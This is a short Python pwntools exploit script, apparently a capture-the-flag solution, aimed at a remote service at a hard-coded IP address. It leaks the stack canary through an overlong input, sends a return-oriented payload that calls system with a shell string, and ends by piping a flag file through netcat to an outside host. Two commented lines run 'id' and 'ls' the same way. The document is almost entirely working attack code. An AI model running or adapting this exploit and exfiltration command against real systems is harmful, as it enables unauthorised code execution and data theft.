from pwn import *
system=0x8048620
msg_recv=0x8048907
bin_sh=0x804b0a0
pop_pop_ret=0x8048b84

#p=remote("localhost",1238)
p=remote("110.10.212.130",8889)

#canary lake
print p.recv(10000)
p.sendline("1")
print p.recv(10000)
dummy="A"*39+"B"
p.sendline(dummy)
p.recvuntil("B")
data=u32(p.recv(4))
print hex(data)
data=data-0xa
print p.recv(10000)


print 'canary -> ',hex(data)
p.sendline("1")
print p.recv()

payload="A"*40+p32(data)+"A"*12+p32(msg_recv)+p32(pop_pop_ret)+p32(bin_sh)+p32(50)+p32(system)+"BBBB"+p32(bin_sh)
p.sendline(payload)
print p.recv()
p.sendline("3")
print p.recv()
#p.sendline("id | nc localhost 8888;")
#p.sendline("ls | nc localhost 8888;")
p.sendline("cat flag | nc 115.40.127.208 8888;")
print 'go!!'

